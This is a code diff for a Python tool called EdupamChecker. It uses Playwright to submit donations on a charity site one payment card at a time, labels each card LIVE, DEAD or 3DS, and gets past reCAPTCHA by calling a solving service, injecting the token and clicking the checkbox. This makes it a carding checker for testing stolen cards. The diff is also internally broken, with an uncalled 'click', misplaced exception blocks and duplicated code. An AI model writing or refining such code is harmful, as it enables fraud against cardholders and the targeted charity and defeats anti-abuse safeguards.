@@ -305,6 +305,105 @@ class EdupamChecker:
             site_key = None
             
             # Buscar diferentes patrones de reCAPTCHA
+            checkbox_selectors = [
+                'div.recaptcha-checkbox',
+                '.recaptcha-checkbox-border',
+                'div[role="checkbox"]',
+                'iframe[title*="recaptcha"]',
+                '#recaptcha-anchor'
+            ]
+            
+            for selector in checkbox_selectors:
+                try:
+                    if page.locator(selector).count() > 0:
+                        page.locator(selector).click
+                        logger.info(f"✅ Haciendo clic en checkbox 'I'm human' con selector: {selector}")
+                        
+                        time.sleep(1)
+                        break
+                except:
+                    continue
+            
+        except Exception as e:
+            logger.warning(f"⚠️ No se pudo hacer clic en checkbox: {e}")
+                    
+            # Resolver captcha
+            logger.info(f"🔄 Resolviendo captcha para ****{card_last4}...")
+            page_url = page.url
+            solution = self.captcha_solver.solve_recaptcha_v2(site_key, page_url)
+            
+            if not solution:
+                logger.error(f"❌ No se pudo resolver el captcha para ****{card_last4}")
+                return False
+            
+            logger.info(f"✅ Captcha resuelto para ****{card_last4}")
+            
+            # Inyectar la solución en la página
+            try:
+                # Ejecutar script para llenar el campo g-recaptcha-response
+                page.evaluate(f"""
+                    () => {{
+                        // Buscar el textarea de respuesta
+                        const responseField = document.getElementById('g-recaptcha-response');
+                        if (responseField) {{
+                            responseField.value = '{solution}';
+                            responseField.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                            console.log('✅ Captcha solution injected');
+                            return true;
+                        }}
+                        
+                        // Si no existe, intentar encontrar por nombre
+                        const responseByName = document.querySelector('[name="g-recaptcha-response"]');
+                        if (responseByName) {{
+                            responseByName.value = '{solution}';
+                            responseByName.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                            console.log('✅ Captcha solution injected by name');
+                            return true;
+                        }}
+                        
+                        // Crear campo si no existe
+                        const newField = document.createElement('textarea');
+                        newField.id = 'g-recaptcha-response';
+                        newField.name = 'g-recaptcha-response';
+                        newField.style.display = 'none';
+                        newField.value = '{solution}';
+                        document.body.appendChild(newField);
+                        console.log('✅ Created and injected captcha solution');
+                        return true;
+                    }}
+                """)
+                
+                # Pequeña espera para que se procese
+                time.sleep(2)
+                
+                # Volver a hacer clic en el botón de donar después de resolver captcha
+                btn = page.locator('#btn-donation')
+                if btn.count() > 0:
+                    btn.click()
+                    logger.info(f"✅ Re-enviando formulario con captcha resuelto para ****{card_last4}")
+                    time.sleep(3)  # Esperar después del segundo envío
+                
+                return True
+                
+            except Exception as e:
+                logger.error(f"❌ Error inyectando solución de captcha para ****{card_last4}: {e}")
+                return False
+                
+        except Exception as e:
+            logger.error(f"❌ Error en solve_captcha_if_present para ****{card_last4}: {e}")
+            return False
+
+    def solve_captcha_if_present(self, page, card_last4):
+        """Detectar y resolver captcha si está presente"""
+        try:
+            # Esperar un momento para que cargue el captcha si existe
+            time.sleep(3)
+            
+            # Verificar si hay reCAPTCHA v2 presente
+            captcha_found = False
+            site_key = None
+            
+            # Buscar diferentes patrones de reCAPTCHA
             selectors_to_check = [
                 'div[data-sitekey]',
                 '.g-recaptcha',
@@ -390,15 +489,55 @@ class EdupamChecker:
                         newField.id = 'g-recaptcha-response';
                         newField.name = 'g-recaptcha-response';
                         newField.style.display = 'none';
-                        newField.value = '{solution}';
-                        document.body.appendChild(newField);
-                        console.log('✅ Created and injected captcha solution');
-                        return true;
-                    }}
-                """)
+                            newField.value = '{solution}';
+                            document.body.appendChild(newField);
+                            console.log('✅ Created and injected captcha solution');
+                            return true;
+                        }}
+                    """)
                 
                 # Pequeña espera para que se procese
                 time.sleep(2)
+                
+                # === AÑADE ESTO: Hacer clic en el checkbox "I'm human" ===
+                try:
+                    # Buscar y hacer clic en el checkbox del captcha
+                    checkbox_selectors = [
+                        'div.recaptcha-checkbox',
+                        '.recaptcha-checkbox-border',
+                        'div[role="checkbox"]',
+                        '#recaptcha-anchor',
+                        'iframe[title*="recaptcha"]'
+                    ]
+                    
+                    for selector in checkbox_selectors:
+                        try:
+                            if page.locator(selector).count() > 0:
+                                page.locator(selector).click()
+                                logger.info(f"✅ Haciendo clic en checkbox con selector: {selector}")
+                                time.sleep(1)
+                                break
+                        except:
+                            continue
+                    
+                    # También intentar con JavaScript
+                    page.evaluate("""
+                        () => {
+                            // Intentar encontrar y hacer clic en el checkbox
+                            const checkboxes = document.querySelectorAll('[role="checkbox"], .recaptcha-checkbox, #recaptcha-anchor');
+                            checkboxes.forEach(cb => {
+                                if (cb.getAttribute('aria-checked') === 'false' || 
+                                    !cb.getAttribute('aria-checked')) {
+                                    cb.click();
+                                }
+                            });
+                            return checkboxes.length > 0;
+                        }
+                    """)
+                    
+                except Exception as e:
+                    logger.warning(f"⚠️ No se pudo hacer clic en checkbox: {e}")
+                # === FIN DEL AÑADIDO ===
                 
                 # Volver a hacer clic en el botón de donar después de resolver captcha
                 btn = page.locator('#btn-donation')
@@ -416,219 +555,6 @@ class EdupamChecker:
         except Exception as e:
             logger.error(f"❌ Error en solve_captcha_if_present para ****{card_last4}: {e}")
             return False
-
-    def check_single_card(self, card_string, amount=50):
-        """Verificar una sola tarjeta - CIERRA después de cada una"""
-        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
-        logger.info(f"🚀 INICIANDO NUEVA VERIFICACIÓN para ****{card_last4}")
-        
-        # Parsear tarjeta
-        card_info = self.parse_card_data(card_string)
-        if not card_info:
-            return {
-                'success': False,
-                'status': 'error',
-                'message': 'Error parseando tarjeta',
-                'card': card_last4
-            }
-        
-        playwright = None
-        browser = None
-        page = None
-        
-        try:
-            logger.info(f"1. Iniciando Playwright FRESCO...")
-            playwright = sync_playwright().start()
-            
-            logger.info(f"2. Lanzando Chromium NUEVO...")
-            browser = playwright.chromium.launch(
-                executable_path='/usr/bin/chromium',
-                headless=True,
-                args=['--no-sandbox', '--disable-setuid-sandbox']
-            )
-            
-            logger.info(f"3. Creando contexto NUEVO...")
-            context = browser.new_context()
-            
-            logger.info(f"4. Creando página NUEVA...")
-            page = context.new_page()
-            
-            # Navegar
-            logger.info(f"5. Navegando a {self.base_url}{self.endpoint}...")
-            page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
-            time.sleep(3)
-            
-            # Verificar URL
-            logger.info(f"6. URL actual: {page.url}")
-            
-            # Llenar formulario
-            logger.info(f"7. Llenando formulario...")
-            if not self.fill_form(page, amount):
-                return {
-                    'success': False,
-                    'status': 'ERROR',
-                    'message': 'Error llenando formulario',
-                    'card': card_last4
-                }
-            
-            # Ingresar tarjeta
-            logger.info(f"8. Ingresando tarjeta ****{card_last4}...")
-            if not self.fill_card_simple(page, card_info):
-                return {
-                    'success': False,
-                    'status': 'ERROR',
-                    'message': 'Error ingresando tarjeta',
-                    'card': card_last4
-                }
-            
-            time.sleep(2)
-            
-            # Enviar
-            logger.info(f"9. Enviando donación...")
-            btn = page.locator('#btn-donation')
-            if btn.count() == 0:
-                return {
-                    'success': False,
-                    'status': 'ERROR',
-                    'message': 'Botón no encontrado',
-                    'card': card_last4
-                }
-            
-            btn.click()
-            
-            # Intentar resolver captcha si aparece
-            captcha_solved = True
-            if self.captcha_solver:
-                logger.info(f"10. Verificando captcha para ****{card_last4}...")
-                captcha_solved = self.solve_captcha_if_present(page, card_last4)
-            
-            # Esperar respuesta después del captcha (o sin captcha)
-            wait_time = 10 if captcha_solved else 5
-            logger.info(f"11. Esperando respuesta ({wait_time} segundos)...")
-            time.sleep(wait_time)
-            
-            # DEBUG EXTREMO
-            logger.info(f"12. URL DESPUÉS de enviar: {page.url}")
-            page_text = page.content()
-            logger.info(f"13. HTML (200 chars): {page_text[:200]}")
-            
-            # Tomar screenshot ÚNICO para esta tarjeta
-            screenshot_b64 = None
-            try:
-                # 1. Hacer scroll para forzar renderizado de elementos lazy
-                page.evaluate("""
-                    () => {
-                        const height = document.body.scrollHeight;
-                        window.scrollTo(0, height);
-                        window.scrollTo(0, 0);
-                    }
-                """)
-                
-                # 2. Esperar un poco después del scroll
-                page.wait_for_timeout(300)
-                
-                # 3. Obtener altura total REAL (puede haber cambiado después del scroll)
-                total_height = page.evaluate("""
-                    () => {
-                        return Math.max(
-                            document.body.scrollHeight,
-                            document.documentElement.scrollHeight
-                        );
-                    }
-                """)
-                
-                # 4. Ajustar viewport si es necesario
-                current_viewport = page.viewport_size
-                if total_height > current_viewport['height']:
-                    page.set_viewport_size({
-                        'width': current_viewport['width'],
-                        'height': total_height + 50  # Margen extra por seguridad
-                    })
-                
-                # 5. Esperar a que se re-renderice con el nuevo tamaño
-                page.wait_for_timeout(1000)
-                
-                # 6. Tomar screenshot
-                screenshot_bytes = page.screenshot(full_page=True)
-                screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
-                logger.info(f"14. 📸 Screenshot ÚNICO tomado para ****{card_last4}")
-                
-            except Exception as e:
-                logger.error(f"Error screenshot: {e}")
-            
-            # Analizar
-            current_url = page.url
-            analysis = self.analyzer.analyze_payment_result(
-                page, current_url, card_last4
-            )
-            
-            # Resultado
-            status_map = {'live': 'LIVE', 'decline': 'DEAD', 'threeds': '3DS', 'unknown': 'ERROR'}
-            final_status = status_map.get(analysis['status'], 'ERROR')
-            
-            messages = {
-                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
-                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
-                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
-                'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
-            }
-            
-            # Añadir información sobre captcha
-            evidence = analysis['evidence']
-            if not captcha_solved and self.captcha_solver:
-                evidence.append('⚠️ No se pudo resolver captcha')
-            
-            result = {
-                'success': True,
-                'status': final_status,
-                'original_status': messages.get(final_status, 'Estado desconocido'),
-                'message': ', '.join(evidence),
-                'response': {
-                    'url': analysis['url'],
-                    'evidence': analysis['evidence'],
-                    'screenshot': screenshot_b64,
-                    'timestamp': datetime.now().isoformat(),
-                    'captcha_solved': captcha_solved
-                },
-                'card': f"****{card_last4}",
-                'gate': 'Edupam',
-                'amount': amount
-            }
-            
-            logger.info(f"15. ✅ Verificación COMPLETADA para ****{card_last4}: {final_status}")
-            
-            # CERRAR TODO
-            logger.info(f"16. Cerrando recursos...")
-            try:
-                page.close()
-                context.close()
-                browser.close()
-                playwright.stop()
-                logger.info(f"17. ✅ Recursos CERRADOS para ****{card_last4}")
-            except Exception as e:
-                logger.error(f"Error cerrando: {e}")
-            
-            return result
-            
-        except Exception as e:
-            logger.error(f"❌ ERROR en ****{card_last4}: {e}")
-            # CERRAR TODO
-            try:
-                if page and not page.is_closed():
-                    page.close()
-                if browser:
-                    browser.close()
-                if playwright:
-                    playwright.stop()
-            except:
-                pass
-            
-            return {
-                'success': False,
-                'status': 'ERROR',
-                'message': f'Error: {str(e)[:100]}',
-                'card': card_last4
-            }
 
 
 # ========== FUNCIONES DEL WORKER ==========
